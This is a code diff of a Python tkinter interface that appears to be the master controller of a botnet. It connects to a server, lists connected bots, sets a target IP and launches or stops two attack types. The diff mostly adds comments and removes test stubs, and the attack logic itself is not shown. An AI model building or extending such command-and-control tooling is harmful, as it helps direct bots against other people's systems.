@@ -22,16 +22,19 @@ frame_c = tk.Frame(master=window, width=400, height=400, bg="blue")
 frame_c.pack(fill=tk.BOTH, side=tk.LEFT, expand=True)
 
 #button commands
+
+#calls the upload command if the client is connected
 def upload():
     target = Targetip.get()
     if connected == True:
         send.targetip = target
         send.changeip()
 
+#calls the connect command with a default port
 def connect():
     ip = IRCip.get()
     global client
-    client = master_client.Client(ip, 9090, 'master')
+    client = master_client.Client(ip, 8080, 'master')
     client.start()
     global connected
     time.sleep(1)
@@ -43,6 +46,9 @@ def connect():
         global botlist
         botlist = master_client.botList
 
+
+#calls the disconnect command, stops the running loop and
+#destroys the GUI window
 def quit():
     if connected == True:
         send.disconnect()
@@ -50,10 +56,12 @@ def quit():
     running = False
     window.destroy()
 
+#only calls the disconnect command
 def disconnect():
     if connected == True:
         send.disconnect()
 
+#calls the changeattk command followed by the startattk command
 def launchattack():
     if connected == True:
         send.attktype = 1
@@ -61,6 +69,7 @@ def launchattack():
         time.sleep(1)
         send.startattk()
 
+#same as above, but sets attack type to 2
 def launchattack2():
     if connected == True:
         send.attktype = 2
@@ -68,6 +77,7 @@ def launchattack2():
         time.sleep(1)
         send.startattk()
 
+#calls the stopattk command
 def stopattack():
     if connected == True:
         send.stopattk()
@@ -149,16 +159,11 @@ bots.bind(
 )
 canvas.create_window((0, 0), window=bots, anchor="nw")
 canvas.pack(fill=tk.Y, expand=True)
-#==================================================================================
 
+#========================================================================================================
 #event handlers
-def handle_keypress(event):
-    window.botcounter += 1
-    label1 = tk.Label(master=bots, relief=tk.RAISED, borderwidth=1, fg="green",
-                      text=f"BOT {window.botcounter}\nIP: 111.1.111.111\nPort: 25565\nJoined: 00.00")
-    label1.pack(padx=5, pady=5)
 
-
+#recreates the bot list based on a fresh botlist request
 def handle_bots(*args):
     list = bots.pack_slaves()
     for i in list:
@@ -193,10 +198,6 @@ buttonB.pack(side=tk.BOTTOM)
 botupdate = tk.IntVar()
 botupdate.trace("w", handle_bots)
 
-#for bot testing, to be removed later
-def vartest(event):
-    botupdate.set(1)
-
 #light-switch handler
 def handle_light(*args):
     light.create_oval(coordinates, fill="green", width=2)
@@ -205,13 +206,12 @@ def handle_light(*args):
 lightupdate = tk.IntVar()
 lightupdate.trace("w", handle_light)
 
-window.bind("<Key a>", handle_keypress)
-window.bind("<Key b>", vartest)
-
 label_a = tk.Label(master=frame_a, relief=tk.RAISED, borderwidth=5, text="Connected Bots")
 label_a.pack(padx=5)
+#===============================================================================================
 
-#packing frames
+
+#packing main frames
 frame_c.pack(fill=tk.BOTH, side=tk.LEFT, expand=True)
 frame_a.pack()
 frame_b.pack(fill=tk.Y, expand=True)
@@ -223,14 +223,6 @@ while running == True:
         if lighton == False:
             handle_light
             lighton = True
-        #oldlist = botlist
-        #send.listbot()
-        #time.sleep(2)
-        #botlist = master_client.botList
-        #time.sleep(10)
-        #if botlist != oldlist:
-            #botupdate.set(1)
-        #botupdate.set(1)
     window.update_idletasks()
     window.update()
     time.sleep(0.01)
